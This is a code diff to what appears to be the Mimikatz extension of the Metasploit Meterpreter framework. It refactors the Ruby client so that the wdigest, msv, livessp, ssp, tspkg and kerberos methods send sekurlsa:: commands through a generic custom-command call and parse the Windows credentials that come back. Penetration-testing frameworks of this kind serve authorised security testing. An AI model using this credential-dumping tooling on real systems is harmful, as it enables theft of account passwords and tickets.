@@ -34,13 +34,17 @@ class Mimikatz < Extension
 			])
 	end
 
-	def mimikatz_send_request(method)
-		request = Packet.create_request(method)
+	def send_custom_command(function, args=[])
+		request = Packet.create_request('mimikatz_custom_command')
+		request.add_tlv(TLV_TYPE_MIMIKATZ_FUNCTION, function)
+		args.each do |a|
+			request.add_tlv(TLV_TYPE_MIMIKATZ_ARGUMENT, a)
+		end
 		response = client.send_request(request)
 		return Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
 	end
 
-	def parse_mimikatz_result(result)
+	def parse_creds_result(result)
 		details = CSV.parse(result)
 		accounts  =  []
 		details.each do |acc|
@@ -56,7 +60,7 @@ class Mimikatz < Extension
 		return accounts
 	end
 
-	def parse_mimikatz_ssp_result(result)
+	def parse_ssp_result(result)
 		details = CSV.parse(result)
 		accounts = []
 		details.each do |acc|
@@ -80,33 +84,33 @@ class Mimikatz < Extension
 	end
 
 	def wdigest
-		result = mimikatz_send_request('mimikatz_wdigest')
-		return parse_mimikatz_result(result)
+		result = send_custom_command('sekurlsa::wdigest')
+		return parse_creds_result(result)
 	end
 
 	def msv
-		result = mimikatz_send_request('mimikatz_msv1_0')
-		return parse_mimikatz_result(result)
+		result = send_custom_command('sekurlsa::msv')
+		return parse_creds_result(result)
 	end
 
 	def livessp
-		result = mimikatz_send_request('mimikatz_livessp')
-		return parse_mimikatz_result(result)
+		result = send_custom_command('sekurlsa::livessp')
+		return parse_creds_result(result)
 	end
 
 	def ssp
-		result = mimikatz_send_request('mimikatz_ssp')
-		return parse_mimikatz_ssp_result(result)
+		result = send_custom_command('sekurlsa::ssp')
+		return parse_ssp_result(result)
 	end
 
 	def tspkg
-		result = mimikatz_send_request('mimikatz_tspkg')
-		return parse_mimikatz_result(result)
+		result = send_custom_command('sekurlsa::tspkg')
+		return parse_creds_result(result)
 	end
 
 	def kerberos
-		result = mimikatz_send_request('mimikatz_kerberos')
-		return parse_mimikatz_result(result)
+		result = send_custom_command('sekurlsa::kerberos')
+		return parse_creds_result(result)
 	end
 end
 
